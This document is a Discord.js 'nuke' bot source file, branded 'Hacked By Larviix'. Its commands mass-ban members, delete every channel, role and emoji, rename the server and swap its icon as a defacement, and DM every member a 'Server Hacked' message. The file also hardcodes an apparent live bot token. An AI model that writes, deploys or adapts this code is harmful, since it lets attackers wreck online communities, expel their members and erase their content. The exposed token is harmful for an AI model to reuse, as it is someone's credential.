const express = require("express");
const app = express();

app.listen(() => console.log("Started nuke."));

app.use('/ping', (req, res) => {
  res.send(new Date());
});


const Discord = require('discord.js');
const client = new Discord.Client();
const ms = require("ms");
const guild = require('guild');



const config = {
"prefix" : ".",
"dmMessage" : "** Server Hacked By Larviix **",
"serverName" : "Hacked By Larviix",
"iconURL" : "https://cdn.discordapp.com/attachments/814473458523308043/814476918639689748/download_2.png",
"banReason" : "Hacked By Larviix | Get shut up",

}
 



client.on("ready", async () => {
console.log(`${client.user.username} is ready to nuke ;)\n Make sure you have written the config variable !!`)     
});



client.on("message", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith(`${config.prefix}nuke`)) {      
      
   message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
 message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.user.username}`)})
                                                                                     
})
   message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})
  })
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((e)=> {console.log(`DELETED ROLE: ${e.name}`)})
    })
   message.guild.emojis.cache.array().forEach(emoji => {emoji.delete().then((e)=> {console.log(`DELETED EMOJI: ${e.name}`)})
  })
   message.guild.setName(config.serverName)
   message.guild.setIcon(config.iconURL)
}
if (message.content.startsWith(`${config.prefix}dmall`)) {      
message.guild.members.cache.array().forEach(m => {m.send(config.dmMessage).then((m)=> {console.log(`MESSAGE SENT TO: ${m.user.username}`)})
})
}
if (message.content.startsWith(`${config.prefix}banall`)) {      
  message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
    message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`BANNED USER: ${m.name}`)})
                                                                                        
   })  
  }
  if(message.content.startsWith(`${config.prefix}deleteall`)){
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((r)=>{
        console.log(`DELETED ROLE: ${r.name}`)
      })
    })
        message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`DELETED CHANNEL: ${c.name}`)})


        
      })
    }
  if(message.content.startsWith(`${config.prefix}ping`)){
    		         message.channel.send('Ping?').then(m => m.edit(`${m.createdTimestamp - message.createdTimestamp}ms`))

  }

//////help
if(message.content.startsWith(`${config.prefix}help`)) {
     let p = config.prefix
     let embed = new Discord.MessageEmbed()
    .setTitle(`Hack Bot Commands.`)
    .addField(`${p}ping`,"Show the ping of the bot")
    .addField(`${p}banall`,"Ban everyone in the server")
    .addField(`${p}deleteall`,"Delete all roles and channels in the server")
    .addField(`${p}dmall`,"Send message to everyone")
   .addField(`${p}createc`,"Create a text and voice channels")
    .addField(`${p}nuke`,"Ban everyone and delete all roles and channels and change name of the server")
    .setFooter(`${client.user.username}`)
    message.member.send(embed)


    

      }
})



client.login("NjI3ODY2MzU4MjI2NjE2MzQw.XZC4HA.Xu7Ts0LfcT-hSIEMUsf42SrbFo0")
